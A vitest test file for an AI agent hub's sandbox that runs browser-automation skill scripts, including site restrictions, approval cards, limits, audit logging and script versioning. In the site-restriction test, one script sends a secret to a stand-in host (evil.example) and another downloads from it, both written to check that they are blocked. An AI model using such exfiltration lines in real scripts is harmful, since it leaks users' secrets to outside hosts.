// The script of a taught skill: the sandbox gives it `browser` and nothing of pio; each browser.* call is one of the
// agent's browser tools made through the gateway (so the click guard, pre-approvals and cards decide as for the agent);
// a failed step stops the run with what was done; a card or a no stops it for good; the agent saves a fixed script
// without a card, and the version before it stays.
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { existsSync, mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { freePort } from "@piomio/testkit";
import type { ToolResult } from "@piomio/shared";
import { Hub, loadConfig } from "../src/index.ts";
import { agentFromMarkdown } from "../src/agents.ts";
import { ScriptSandbox } from "../src/signals/sandbox.ts";
import { checkSkillScript, describeRun, numbered, onSkillSite, runSkillScript, SKILL_SCRIPT_LIMITS } from "../src/skill-scripts.ts";
import { parseSkillSave, skillSaveSummary } from "../src/taught-skills.ts";

const fixtures = join(import.meta.dirname, "fixtures");
const textOf = (r: ToolResult) => r.content.map((c) => (c.type === "text" ? c.text : "")).join("\n");
const ok = (text: string, meta?: ToolResult["_meta"]): ToolResult => ({ content: [{ type: "text", text }], ...(meta ? { _meta: meta } : {}) });
const err = (text: string, meta?: ToolResult["_meta"]): ToolResult => ({ ...ok(text, meta), isError: true });

async function until<T>(fn: () => T | undefined | false, what: string, timeoutMs = 10_000): Promise<T> {
  const t0 = Date.now();
  while (Date.now() - t0 < timeoutMs) {
    const v = fn();
    if (v) return v as T;
    await new Promise((r) => setTimeout(r, 50));
  }
  throw new Error(`timed out waiting for ${what}`);
}

interface El {
  ref: string;
  role: string;
  name: string;
}

/** The browser plugin's tools as the runner uses them: a page of elements, found by role and name as browser_snapshot does. */
function fakeBrowser(on: El[] | (() => El[]), over: (tool: string, input: any) => ToolResult | undefined = () => undefined) {
  const calls: Array<{ tool: string; input: any }> = [];
  let url = "about:blank";
  const tail = () => `\nPage: Shop — ${url}`;
  const low = (s: string) => s.replace(/\s+/g, " ").trim().toLowerCase();
  const matches = (el: El, role?: string, name?: string) => {
    if (role && el.role !== role) return false;
    if (name === undefined) return true;
    const re = new RegExp(`^${low(name).split("*").map((p) => p.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join("[\\s\\S]*")}$`, "u");
    return re.test(low(el.name));
  };
  const call = async (tool: string, input: any): Promise<ToolResult> => {
    calls.push({ tool, input });
    const elements = typeof on === "function" ? on() : on;
    const special = over(tool, input);
    if (special) return special;
    const has = () => elements.some((e) => e.ref === input.ref);
    switch (tool) {
      case "browser_open":
        url = input.url;
        return ok(`Opened.${tail()}`);
      case "browser_snapshot": {
        const found = elements.filter((e) => matches(e, input.role, input.name));
        const narrowed = input.role !== undefined || input.name !== undefined;
        return ok(JSON.stringify({ url, title: "Shop", total: found.length, elements: found, ...(narrowed && !found.length ? { others: elements.map((e) => e.name) } : {}) }) + tail());
      }
      case "browser_click":
        return has() ? ok(`Clicked [${input.ref}].${tail()}`) : err(`Element ${input.ref} was not found on the current page.${tail()}`);
      case "browser_type":
        return has() ? ok(`Typed into [${input.ref}]: "${input.text}".${tail()}`) : err(`Element ${input.ref} was not found.${tail()}`);
      case "browser_get_text":
        return ok(`Итого: 2 400 ₸${tail()}`);
      case "browser_submit":
        return ok(`Done: ${input.description}. Clicked [${input.ref}] button "${input.label}".${tail()}`);
      default:
        return ok(`ok${tail()}`);
    }
  };
  return { call, calls };
}

const SHOP: El[] = [
  { ref: "e1", role: "link", name: "Вода 19 л" },
  { ref: "e2", role: "textbox", name: "Количество" },
  { ref: "e3", role: "button", name: "Оформить заказ 2 400 ₸" },
  { ref: "e4", role: "link", name: "Заказ № 1" },
  { ref: "e5", role: "link", name: "Заказ № 2" },
];

const ORDER = `export default async function ({ quantity = 2 }, browser) {
  await browser.open("https://5vodi.kz/catalog");
  await browser.click({ role: "link", name: "вода 19 л" });
  await browser.type({ role: "textbox", name: "Количество" }, String(quantity));
  const total = /Итого:\\s*([\\d\\s]+)/.exec(await browser.text())[1].replace(/\\s/g, "");
  browser.log("total", total);
  await browser.submit({ role: "button", name: "Оформить заказ*" }, { description: "Заказ " + quantity, amount: Number(total), currency: "KZT" });
  return { total: Number(total), page: await browser.page() };
}
`;

describe("a skill's script in the sandbox", () => {
  const sandbox = new ScriptSandbox();
  const sites = ["5vodi.kz"];
  afterAll(() => sandbox.stop());

  it("gets its input and the browser, returns any JSON, and has nothing of pio", async () => {
    const seen: string[] = [];
    const r = await sandbox.run(
      `export default async function (input, browser, more) {
         const out = await browser.click({ name: "x" });
         return { n: input.n + 1, out, keys: Object.keys(browser).sort(), frozen: Object.isFrozen(browser), more: typeof more, pio: typeof pio, host: typeof __host };
       }`,
      { n: 1 },
      async (name, args) => {
        seen.push(`${name} ${JSON.stringify(args)}`);
        return "clicked";
      },
      SKILL_SCRIPT_LIMITS,
      "browser",
    );
    expect(r.error).toBeUndefined();
    expect(seen).toEqual(['browser.click [{"name":"x"}]']);
    expect(r.value).toEqual({
      n: 2,
      out: "clicked",
      keys: ["back", "click", "download", "fillSecret", "find", "log", "open", "page", "press", "scroll", "submit", "text", "type", "upload", "wait"],
      frozen: true,
      more: "undefined",
      pio: "undefined",
      host: "undefined",
    });
    // Any JSON is a result: a trigger's verdict shape is not asked for.
    expect((await sandbox.run("export default () => [1, 2]", {}, async () => undefined, SKILL_SCRIPT_LIMITS, "browser")).value).toEqual([1, 2]);
    expect((await sandbox.run("export default () => [1, 2]", { signal: {}, now: {} }, async () => undefined)).error).toMatch(/invalid verdict/);
  });

  it("checks a script without running it", async () => {
    expect(await checkSkillScript(ORDER, sandbox)).toBeUndefined();
    // TypeScript is stripped, as for a trigger's script.
    expect(await checkSkillScript("export default async (input: { n: number }, browser: any): Promise<number> => input.n", sandbox)).toBeUndefined();
    expect(await checkSkillScript("export default async function (input, browser) { await browser.open( }", sandbox)).toMatch(/syntax|Syntax|expected|unexpected/i);
    expect(await checkSkillScript("const x = 1;", sandbox)).toMatch(/must export a default function/);
    // Its body does not run: a script that would throw at once still compiles.
    expect(await checkSkillScript('export default async function () { throw new Error("ran") }', sandbox)).toBeUndefined();
    expect(await checkSkillScript(`// ${"x".repeat(70_000)}\nexport default () => 1`, sandbox)).toMatch(/longer than 64 KB/);
  });

  it("does the steps with the agent's browser tools, finding each target by role and name", async () => {
    const b = fakeBrowser(SHOP);
    const run = await runSkillScript(ORDER, { quantity: 3 }, { call: b.call, sites, sandbox });
    expect(run.error).toBeUndefined();
    expect(run.ok).toBe(true);
    expect(run.value).toEqual({ total: 2400, page: { url: "https://5vodi.kz/catalog", title: "Shop" } });
    expect(run.logs).toEqual(["total 2400"]);
    expect(b.calls.map((c) => c.tool)).toEqual([
      "browser_open",
      "browser_snapshot",
      "browser_click",
      "browser_snapshot",
      "browser_type",
      "browser_get_text",
      "browser_snapshot",
      "browser_submit",
      "browser_snapshot",
    ]);
    // A target is waited for; the click names the ref the page gave.
    expect(b.calls[1].input).toEqual({ json: true, role: "link", name: "вода 19 л", waitMs: 8000 });
    expect(b.calls[2].input).toEqual({ ref: "e1" });
    expect(b.calls[4].input).toEqual({ ref: "e2", text: "3" });
    // The consequential step goes as browser_submit with the control's current name and the page it is on.
    expect(b.calls[7].input).toEqual({ ref: "e3", label: "Оформить заказ 2 400 ₸", url: "https://5vodi.kz/catalog", description: "Заказ 3", amount: 2400, currency: "KZT" });
    expect(run.trace.map((t) => `${t.call} ${t.ok}`)).toEqual(["browser.open true", "browser.click true", "browser.type true", "browser.text true", "browser.submit true", "browser.page true"]);
    const said = describeRun("order-water", run, ORDER);
    expect(said).toMatch(/^The script of "order-water" finished: 6 browser call\(s\)/);
    expect(said).toContain('"total": 2400');
    expect(said).toContain("untrusted");
  });

  it("opens only the skill's sites", async () => {
    expect(onSkillSite("https://www.5vodi.kz/cart", sites)).toBe(true);
    expect(onSkillSite("shop.5vodi.kz", sites)).toBe(true);
    expect(onSkillSite("https://5vodi.kz.evil.example/", sites)).toBe(false);
    expect(onSkillSite("https://evil.example/?next=5vodi.kz", sites)).toBe(false);
    const b = fakeBrowser(SHOP);
    const run = await runSkillScript('export default async (i, browser) => { await browser.open("https://evil.example/?q=" + i.secret) }', { secret: "s3" }, { call: b.call, sites, sandbox });
    expect(run.ok).toBe(false);
    expect(run.error).toMatch(/is not on the skill's sites \(5vodi\.kz\)/);
    expect(b.calls).toEqual([]);
    const none = await runSkillScript('export default async (i, browser) => { await browser.open("https://5vodi.kz/") }', {}, { call: b.call, sites: [], sandbox });
    expect(none.error).toMatch(/names no sites/);
    // A file by its address too.
    const file = await runSkillScript('export default async (i, browser) => browser.download({ url: "https://evil.example/x?d=1" })', {}, { call: b.call, sites, sandbox });
    expect(file.error).toMatch(/download: .* is not on the skill's sites/);
    expect(b.calls).toEqual([]);
    expect((await runSkillScript('export default async (i, browser) => browser.download({ url: "https://5vodi.kz/price.pdf" })', {}, { call: b.call, sites, sandbox })).ok).toBe(true);
    // The click guard's refusal names the script's own call for that step.
    const guarded = fakeBrowser(SHOP, (tool) => (tool === "browser_click" ? err('Refused: [e3] button "Оформить заказ" looks like an action with consequences. Nothing was clicked.') : undefined));
    const refused = await runSkillScript('export default async (i, browser) => browser.click({ name: "Оформить заказ*" })', {}, { call: guarded.call, sites, sandbox });
    expect(refused.halted).toBeUndefined();
    expect(refused.error).toMatch(/Nothing was clicked\. In a script that step is browser\.submit\(target, \{description, amount, currency\}\)/);
  });

  it("a step that fails stops the run: the agent gets the call, what the page has instead, what was done and the script", async () => {
    // The site renamed the catalog link.
    const b = fakeBrowser(SHOP.map((e) => (e.ref === "e1" ? { ...e, name: "Питьевая вода 19 л" } : e)));
    const run = await runSkillScript(ORDER, {}, { call: b.call, sites, sandbox });
    expect(run.ok).toBe(false);
    expect(run.halted).toBeUndefined();
    expect(run.error).toMatch(/no link "вода 19 л" on the page https:\/\/5vodi\.kz\/catalog\. The page has: "Питьевая вода 19 л"/);
    expect(run.error).toMatch(/at script\.mjs:3/);
    expect(run.trace.map((t) => t.ok)).toEqual([true, false]);
    expect(b.calls.some((c) => c.tool === "browser_submit")).toBe(false);
    const said = describeRun("order-water", run, ORDER);
    expect(said).toMatch(/stopped at call 2, browser\.click\(\{"role":"link","name":"вода 19 л"\}\)/);
    expect(said).toContain('Calls before it:\n1. browser.open("https://5vodi.kz/catalog") ok');
    expect(said).toContain("Do the rest of the task by hand from this point");
    expect(said).toContain("skill_script_save");
    expect(said).toContain(`\n3|   await browser.click({ role: "link", name: "вода 19 л" });`);
    expect(numbered("a\nb\n")).toBe("1| a\n2| b");
  });

  it("several matches need a fuller name or nth; a script may catch an error and go on; find lists matches", async () => {
    const b = fakeBrowser(SHOP);
    const many = await runSkillScript('export default async (i, browser) => browser.click({ role: "link", name: "Заказ *" })', {}, { call: b.call, sites, sandbox });
    expect(many.error).toMatch(/2 elements match link "Заказ \*".*give a fuller name, or nth/);
    const nth = await runSkillScript(
      `export default async (i, browser) => {
         const all = await browser.find({ role: "link", name: "Заказ *" });
         await browser.click({ role: "link", name: "Заказ *", nth: 2 });
         let missed = "";
         try { await browser.click({ name: "Закрыть", waitMs: 0 }) } catch (e) { missed = e.message }
         await browser.click("e4");
         return { names: all.map((e) => e.name), missed };
       }`,
      {},
      { call: b.call, sites, sandbox },
    );
    expect(nth.ok).toBe(true);
    expect(nth.value).toMatchObject({ names: ["Заказ № 1", "Заказ № 2"] });
    expect((nth.value as any).missed).toMatch(/no "Закрыть" on the page/);
    expect(b.calls.filter((c) => c.tool === "browser_click").map((c) => c.input.ref)).toEqual(["e5", "e4"]);
    // What is not a target says what one is.
    const bad = await runSkillScript("export default async (i, browser) => browser.click(42)", {}, { call: b.call, sites, sandbox });
    expect(bad.error).toMatch(/click: the target is a ref \("e12"\) or \{role, name\}/);
    // A consequential step is approved by the control's name: a bare ref has none.
    const ref = await runSkillScript('export default async (i, browser) => browser.submit("e3", { description: "x" })', {}, { call: b.call, sites, sandbox });
    expect(ref.error).toMatch(/submit: give the target as \{role, name\}/);
  });

  it("a step waiting for the person's tap, or refused, stops the run for good: a script cannot go on past a card", async () => {
    const waiting = fakeBrowser(SHOP, (tool) => (tool === "browser_submit" ? ok("The action is waiting for the user's approval (approvalId=apr_1).", { status: "awaiting_approval", approvalId: "apr_1" }) : undefined));
    const stubborn = `export default async function (i, browser) {
      try { await browser.submit({ name: "Оформить заказ*" }, { description: "Заказ" }) } catch {}
      await browser.click({ role: "link", name: "Вода 19 л" }).catch(() => {});
      return "done anyway";
    }`;
    const run = await runSkillScript(stubborn, {}, { call: waiting.call, sites, sandbox });
    expect(run.ok).toBe(false);
    expect(run.halted).toBe("approval");
    expect(run.value).toBeUndefined();
    // Nothing reached the browser after the card.
    expect(waiting.calls.map((c) => c.tool)).toEqual(["browser_snapshot", "browser_submit"]);
    expect(run.trace[1]).toMatchObject({ call: "browser.click", ok: false });
    expect(run.trace[1].error).toMatch(/the run has stopped/);
    const said = describeRun("order-water", run, stubborn);
    expect(said).toMatch(/stopped at call 1, browser\.submit\(.*\): it waits for the person's tap on its card/);
    expect(said).toContain("the script is not at fault");
    expect(said).not.toContain("1| export default");

    const refused = fakeBrowser(SHOP, (tool) => (tool === "browser_submit" ? err("The user declined the action: Заказ", { status: "denied" }) : undefined));
    const no = await runSkillScript(stubborn, {}, { call: refused.call, sites, sandbox });
    expect(no.halted).toBe("denied");
    expect(describeRun("order-water", no, stubborn)).toMatch(/it was refused \(the person, or the hub's policy\)/);
  });

  it("holds a run to its limits", async () => {
    const b = fakeBrowser(SHOP);
    const few = await runSkillScript("export default async (i, browser) => { for (;;) await browser.back() }", {}, { call: b.call, sites, sandbox, limits: { ...SKILL_SCRIPT_LIMITS, maxCalls: 3 } });
    expect(few.error).toMatch(/too many browser calls \(3\)/);
    expect(b.calls).toHaveLength(3);
    const spin = await runSkillScript("export default async () => { for (;;) {} }", {}, { call: b.call, sites, sandbox, limits: { ...SKILL_SCRIPT_LIMITS, cpuMs: 100 } });
    expect(spin.ok).toBe(false);
    expect(describeRun("order-water", spin, "x")).toContain("stopped:");
  });

  it("the card of a skill saved with a script says so", () => {
    const s = parseSkillSave({ name: "order-water", description: "Orders water", instructions: "Steps", script: `${ORDER}\n\n` });
    expect(s.script).toBe(ORDER);
    expect(skillSaveSummary(s, "en")).toBe("Save the skill «order-water»: Orders water · with a script that does its steps");
    expect(skillSaveSummary(s, "ru")).toBe("Сохранить навык «order-water»: Orders water · со скриптом, который проходит шаги сам");
    expect(() => parseSkillSave({ name: "order-water", description: "x", instructions: "y", script: "x".repeat(70_000) })).toThrow(/longer than 64 KB/);
  });
});

describe("a skill's script on the hub", () => {
  let hub: Hub;
  let dataDir = "";
  let session = "";
  const done: Array<{ tool: string; input: any }> = [];
  let page: El[] = SHOP;

  const call = (name: string, input: unknown, s = session) => hub.gateway.call(s, name, input);
  const skillFile = (name: string, file: string) => join(dataDir, "skills", name, file);
  const WATER = { name: "order-water", description: "Orders water on 5vodi.kz", instructions: "## Inputs\n- quantity\n## Steps\n1. Click link «Вода 19 л».", sites: ["5vodi.kz"] };

  beforeAll(async () => {
    const [port, consolePort, egressPort] = [await freePort(), await freePort(), await freePort()];
    dataDir = mkdtempSync(join(tmpdir(), "piomio-skill-script-"));
    const config = loadConfig(
      { PIOMIO_PORT: String(port), PIOMIO_DEVICES: "0", PIOMIO_CONSOLE_PORT: String(consolePort), PIOMIO_EGRESS_PORT: String(egressPort), TZ: "UTC" },
      { dataDir, builtinPluginsDirs: [join(fixtures, "plugins")], builtinAgentsDir: join(fixtures, "agents") },
    );
    hub = new Hub(config);
    await hub.start();
    hub.settings.update({ language: "en", approvalInlineWaitSec: 0.2 });
    for (const id of ["desk", "clerk"]) {
      hub.saveAgent(agentFromMarkdown(id, `---\nname: ${id}\ndescription: An agent\nbrains: [fake@local]\ninitiative: 1\n---\nYou are ${id}.`, "user"), "user");
    }
    session = hub.store.createSession({ conversationId: hub.store.agentConversation("desk").id, agentId: "desk", brainRef: "fake@local", background: false }).row.id;
    // The browser plugin's tools, as the hub has them: reads that bring outside content, clicks, and the consequential one.
    const fake = fakeBrowser(() => page);
    const tool = (name: string, effect: "read" | "local-write" | "external") =>
      hub.tools.register({ name, description: name, effect, source: true, inputSchema: { type: "object" }, owner: "browser" }, async (input: any) => {
        done.push({ tool: name, input });
        return fake.call(name, input);
      });
    for (const name of ["browser_open", "browser_snapshot", "browser_get_text"]) tool(name, "read");
    for (const name of ["browser_click", "browser_type"]) tool(name, "local-write");
    tool("browser_submit", "external");
  });

  afterAll(async () => {
    await hub?.stop();
  });

  it("is saved with its skill on the person's card, and skill_load says to run it first", async () => {
    const broken = await call("hub_skill_save", { ...WATER, script: "export default async function ( {" });
    expect(textOf(broken)).toMatch(/nobody was asked, the script does not compile/);
    expect(hub.approvals.list(["pending"])).toHaveLength(0);

    const asked = call("hub_skill_save", { ...WATER, script: ORDER, allow: [{ site: "5vodi.kz", label: "Оформить заказ 2 400 ₸", maxAmount: 3000, currency: "KZT" }] });
    const card = await until(() => hub.approvals.list(["pending"]).find((a) => a.tool === "hub_skill_save"), "the skill's card");
    expect(card.summary).toContain("with a script that does its steps");
    hub.approvals.resolve(card.id, "approve", { via: "web" });
    expect(textOf(await asked)).toMatch(/It has a script: skill_run \{name: "order-water"\}/);
    expect(readFileSync(skillFile("order-water", "script.js"), "utf8")).toBe(ORDER);

    const loaded = textOf(await call("skill_load", { name: "order-water" }));
    expect(loaded).toContain("1. Click link «Вода 19 л».");
    expect(loaded).toMatch(/This skill has a script \(\d+ lines\)\. Run it first: skill_run/);
    expect(textOf(await call("skill_load", { name: "order-water", script: true }))).toContain("1| export default async function ({ quantity = 2 }, browser) {");
    // The script is not one of the skill's files to read as data.
    expect(hub.gateway.listFor(hub.store.getSession(session)!).map((t) => t.name)).toEqual(expect.arrayContaining(["skill_run", "skill_script_save"]));
  });

  it("skill_run does the steps through the gateway: the pre-approved click runs, and every call is in the audit log", async () => {
    done.length = 0;
    const r = await call("skill_run", { name: "order-water", input: { quantity: 2 } });
    expect(r.isError).toBeFalsy();
    expect(textOf(r)).toMatch(/The script of "order-water" finished: 6 browser call\(s\)/);
    expect(textOf(r)).toContain('"total": 2400');
    expect(done.find((c) => c.tool === "browser_submit")?.input).toMatchObject({ label: "Оформить заказ 2 400 ₸", amount: 2400, currency: "KZT" });
    const log = hub.audit.list({ limit: 200 });
    expect(log.some((e) => e.action === "skill.script.run" && e.target === "order-water")).toBe(true);
    expect(log.filter((e) => e.action === "policy.decision" && e.target === "browser_submit").length).toBeGreaterThan(0);
    // What the script read came from pages: the session is tainted like after the agent's own browser calls.
    expect(hub.store.getSession(session)!.tainted).toBe(true);
  });

  it("a click past the approved limit waits for the person, and the run stops there", async () => {
    done.length = 0;
    page = SHOP.map((e) => (e.ref === "e3" ? { ...e, name: "Оформить заказ 9 400 ₸" } : e));
    try {
      // The page's total is still 2 400, but the control now says 9 400: the script passes what it read; the limit is on the amount.
      const over = ORDER.replace("amount: Number(total)", "amount: 9400");
      expect(textOf(await call("skill_script_save", { name: "order-water", script: over, note: "test: amount over the limit" }))).toMatch(/Saved the script/);
      const r = await call("skill_run", { name: "order-water" });
      expect(r.isError).toBe(true);
      expect(textOf(r)).toMatch(/stopped at call 5, browser\.submit\(.*\): it waits for the person's tap on its card/);
      expect(hub.approvals.list(["pending"]).some((a) => a.tool === "browser_submit")).toBe(true);
    } finally {
      for (const a of hub.approvals.list(["pending"])) hub.approvals.resolve(a.id, "deny", { via: "web" });
      page = SHOP;
    }
  });

  it("the agent fixes the script by itself, also after reading the web; the version before stays and comes back", async () => {
    expect(hub.store.getSession(session)!.tainted).toBe(true);
    const before = readFileSync(skillFile("order-water", "script.js"), "utf8");
    const fixed = ORDER.replace("вода 19 л", "Питьевая вода 19 л");
    const saved = await call("skill_script_save", { name: "order-water", script: fixed, note: "The catalog link was renamed" });
    expect(saved.isError).toBeFalsy();
    expect(textOf(saved)).toMatch(/Saved the script of "order-water" \(script\.js\); the version before it is kept/);
    // No card was shown for it.
    expect(hub.approvals.list(["pending"])).toHaveLength(0);
    expect(readFileSync(skillFile("order-water", "script.js"), "utf8")).toBe(fixed);
    expect(readFileSync(skillFile("order-water", "script.prev.js"), "utf8")).toBe(before);
    const entry = hub.audit.list({ limit: 50 }).find((e) => e.action === "skill.script.save");
    expect(entry?.data).toMatchObject({ note: "The catalog link was renamed", replaced: true, tainted: true });

    expect(textOf(await call("skill_script_save", { name: "order-water", script: fixed }))).toMatch(/nothing changed/);
    expect(textOf(await call("skill_script_save", { name: "order-water", script: "export default (" }))).toMatch(/Not saved, the script does not compile/);
    expect(readFileSync(skillFile("order-water", "script.js"), "utf8")).toBe(fixed);

    expect(textOf(await call("skill_script_save", { name: "order-water", restore: true }))).toMatch(/previous version .* is back/);
    expect(readFileSync(skillFile("order-water", "script.js"), "utf8")).toBe(before);
    expect(readFileSync(skillFile("order-water", "script.prev.js"), "utf8")).toBe(fixed);
    // The pre-approval and the sites are the person's: a script save touches neither.
    expect(hub.rules.list().filter((r) => r.createdVia === "skill")).toHaveLength(1);
    expect(hub.skills.get("order-water")!.sites).toEqual(["5vodi.kz"]);
  });

  it("an update of the skill without a script keeps the one it has", async () => {
    await call("skill_script_save", { name: "order-water", script: ORDER, note: "back to the working one" });
    const allow = [{ site: "5vodi.kz", label: "Оформить заказ 2 400 ₸", maxAmount: 3000, currency: "KZT" }];
    const asked = call("hub_skill_save", { ...WATER, description: "Orders water, updated", replaces: "order-water", allow });
    const card = await until(() => hub.approvals.list(["pending"]).find((a) => a.tool === "hub_skill_save"), "the update's card");
    expect(card.summary).not.toContain("with a script");
    hub.approvals.resolve(card.id, "approve", { via: "web" });
    await asked;
    expect(readFileSync(skillFile("order-water", "script.js"), "utf8")).toBe(ORDER);
    expect(existsSync(skillFile("order-water", "script.prev.js"))).toBe(true);
  });

  it("only who has the skill runs or changes its script; a scheduled run of the skill may do both", async () => {
    // The skill is Desk's (it learned it): Clerk has neither the instructions nor the script.
    const clerk = hub.store.createSession({ conversationId: hub.store.agentConversation("clerk").id, agentId: "clerk", brainRef: "fake@local", background: false }).row.id;
    expect(textOf(await call("skill_run", { name: "order-water" }, clerk))).toMatch(/is not one of your skills/);
    expect(textOf(await call("skill_script_save", { name: "order-water", script: ORDER.replace("quantity = 2", "quantity = 9") }, clerk))).toMatch(/is not one of your skills/);
    expect(textOf(await call("skill_run", { name: "no-such" }))).toMatch(/There is no skill "no-such"/);

    const background = (skill?: string) => {
      const task = hub.store.createTask({ agentId: "desk", title: "Water", goal: "Order water", background: true, createdBy: "trigger", status: "running", ...(skill ? { skill } : {}) });
      return hub.store.createSession({ conversationId: task.conversationId, taskId: task.id, agentId: "desk", brainRef: "fake@local", background: true }).row.id;
    };
    // A background run that follows no taught skill may only read.
    expect((await call("skill_run", { name: "order-water" }, background())).isError).toBe(true);
    const run = await call("skill_run", { name: "order-water" }, background("order-water"));
    expect(textOf(run)).toMatch(/The script of "order-water" finished/);
    expect(run.isError).toBeFalsy();
  });

  it("a skill without a script says to do it by hand", async () => {
    const asked = call("hub_skill_save", { name: "check-prices", description: "Checks prices", instructions: "Look at the catalog.", sites: ["5vodi.kz"] });
    const card = await until(() => hub.approvals.list(["pending"]).find((a) => a.tool === "hub_skill_save"), "the card");
    hub.approvals.resolve(card.id, "approve", { via: "web" });
    await asked;
    expect(textOf(await call("skill_run", { name: "check-prices" }))).toMatch(/has no script: do its steps by hand/);
    expect(textOf(await call("skill_load", { name: "check-prices" }))).not.toContain("has a script");
    expect(textOf(await call("skill_script_save", { name: "check-prices", restore: true }))).toMatch(/no previous version/);
    // The first script of a skill that had none needs no card either.
    expect(textOf(await call("skill_script_save", { name: "check-prices", script: 'export default async (i, browser) => { await browser.open("https://5vodi.kz/"); return browser.text() }' }))).toMatch(/Saved the script of "check-prices" \(script\.js\)\. skill_run runs it/);
    expect(textOf(await call("skill_run", { name: "check-prices" }))).toContain("Итого: 2 400 ₸");
  });
});
